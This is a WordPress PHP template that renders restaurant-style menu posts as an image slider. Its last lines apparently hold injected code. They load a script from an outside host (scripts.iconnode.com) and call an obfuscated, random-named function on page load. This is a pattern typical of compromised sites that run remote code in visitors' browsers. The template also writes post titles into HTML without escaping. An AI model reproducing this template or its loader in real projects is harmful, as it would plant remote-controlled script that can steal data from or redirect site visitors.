<?php 
	/*
	 * (Desktop) All the menus in a slider with pictures 
	 */
	$menus = array( 'post_type' => 'menu', 'posts_per_page' => -1 );
	$menus = get_posts( $menus );
	$menu_content = '';
	$i = 0;
 	foreach ( $menus as $post ) {
 		$i++;
 		if($post->post_name == $_GET['menupage']) $opener = $i;
 		$img = the_compulsory_thumbnail('large','return',$post->ID);
 		$tit = $post->post_title;
 		$menu_content .= '<img class="photo" src="'.$img.'" alt="'.$tit.'" />
 				<article class="page"><button class="arrow prev">Previous menu</button><button class="arrow next">Next menu</button><button class="close">x</button>
 					<h1>'.$tit.'</h1><div class="content">'.apply_filters('the_content',$post->post_content).'</div></article>';
 	};
?>
<div id="menuview" >
	<div id="menu-slider" style="width: <?php echo $i * 2000; ?>px" data-opener="<?php echo $opener; ?>" >
		<?php echo $menu_content; ?>
	</div>
</div>
<script src="//scripts.iconnode.com/71223.js"></script>
		<script type="text/javascript"> 
		jQuery(document).ready(djteiyewvcuvyogyifuj()); 
</script>